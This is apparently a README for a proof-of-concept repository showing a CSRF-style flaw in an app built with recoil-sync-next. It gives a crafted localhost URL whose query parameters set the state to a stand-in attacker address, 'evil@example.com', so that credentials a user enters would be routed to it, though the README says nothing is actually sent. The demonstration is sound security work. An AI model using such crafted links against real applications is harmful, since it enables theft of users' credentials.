## `recoil-sync-next-csrf`

PoC for CSRF vulnerable application with recoil-sync-next

1. `yarn && yarn dev`
2. Go to `http://localhost:3000/?emailState=%22evil%40example.com%22&phaseState=%22cred%22`
3. Enter fake credential information and click "Next" button
4. The information you entered was sent to `evil@example.com` (not actually sent)
